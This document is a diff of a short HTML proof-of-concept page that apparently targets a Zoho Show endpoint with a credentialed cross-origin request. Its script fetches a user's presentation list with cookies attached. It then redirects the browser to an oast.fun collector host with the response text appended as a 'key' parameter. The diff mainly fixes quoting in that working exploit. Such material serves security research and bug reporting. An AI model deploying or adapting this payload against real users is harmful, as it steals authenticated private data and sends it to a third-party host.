@@ -2,12 +2,13 @@
     <body>
         <iframe src="https://jgjarlyhkvgbfbdpgrkw34ikmupj1tcsv.oast.fun"></iframe>
         <script>
-        var req=new XMLHttpRequest(); 
-        req.onload = reqListener;    
-        req.open("GET", "https://show.localzoho.com/show/getpreslist?count=20&ptype=1&type=0&from=0&sortby=1&ascending=false&req_count=13_1552656C-A23D-4392-8F4C-20E3B0F12B0D_true&DATE=1706247320604, true); 
-        req.withCredentials = true;
-        req.send();
-            function reqListener() {
+        var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://show.localzoho.com/show/getpreslist?count=20&ptype=1&type=0&from=0&sortby=1&ascending=false&req_count=13_1552656C-A23D-4392-8F4C-20E3B0F12B0D_true&DATE=1706247320604',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
    location='//jgjarlyhkvgbfbdpgrkw34ikmupj1tcsv.oast.fun?key='+this.responseText;
 };
         </script>
